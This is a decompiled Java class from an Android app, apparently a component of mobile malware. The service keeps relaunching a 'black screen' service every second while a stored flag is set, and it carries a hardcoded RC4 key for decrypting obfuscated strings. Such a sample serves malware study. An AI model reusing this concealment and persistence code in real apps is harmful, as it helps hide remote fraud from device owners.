/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.app.IntentService
 *  android.content.ComponentName
 *  android.content.Context
 *  android.content.Intent
 *  android.util.Base64
 */
package com.example.mmm.Service;

import android.app.IntentService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.util.Base64;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Service.srvBlackScreen;
import com.example.mmm.Utils.utils;
import com.example.mmm.constants;

public class srvIBlackScreen
extends IntentService {
    constants consts = new constants();
    utils utl = new utils();

    public srvIBlackScreen() {
        super("");
    }

    private String decrypt_str(String string) {
        return new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode((String)string, (int)0), "UTF-8"))));
    }

    protected void onHandleIntent(Intent intent) {
        do {
            if (!this.utl.SettingsRead((Context)this, "RS").equals("true")) {
                this.stopSelf();
                return;
            }
            this.startService(new Intent((Context)this, srvBlackScreen.class));
            utils.chalkTile(1000);
        } while (true);
    }
}

